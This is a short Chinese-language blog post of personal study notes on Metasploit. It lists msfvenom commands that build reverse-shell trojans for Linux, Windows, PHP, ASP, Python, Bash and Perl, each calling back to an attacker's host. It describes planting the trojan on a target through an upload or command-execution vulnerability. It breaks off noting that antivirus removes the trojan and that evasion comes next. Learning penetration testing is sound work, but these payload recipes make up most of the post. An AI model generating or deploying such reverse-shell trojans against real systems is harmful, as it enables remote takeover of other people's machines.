---
title: metasploit 学习02
category: 
- 渗透测试
tags: 
- metasploit

---

## metasploit 学习02

**简介：**本地环境存在诸多限制，比如要发送payloaad反弹shell就需要一个公网ip。因此我选择将nsf搭建在vps上，具体教程请[参考](https://www.linuxidc.com/Linux/2019-01/156378.htm)：

**内容：**

利用msfvenom生成木马并且反弹shell。

首先介绍下msfvenon的基本用法：

![image-20210613005623957](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210613005623957.png)

列举出常用的生成shell的命令：

```sh
linux：
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

windows：
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

PHP:
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

Python：
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

Bash：
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

Perl：
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

木马生成后只要想办法放到目标机器下，根据目标机器的具体情况选择合适的方式下载并执行你的木马即可，然后就可以在攻击机上获取到反弹回来的shell了：

**实例**

首先生成木马

![image-20210613005640652](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210613005640652.png)

然后在靶机上找到一个上传漏洞或者命令执行漏洞，下载或者上传我们生成的木马到靶机，这里我以命令执行为例：

上传后木马一直被杀软杀掉，考虑用免杀马，未完......

https://blog.csdn.net/qq_36119192/article/details/106348527

<!-- more -->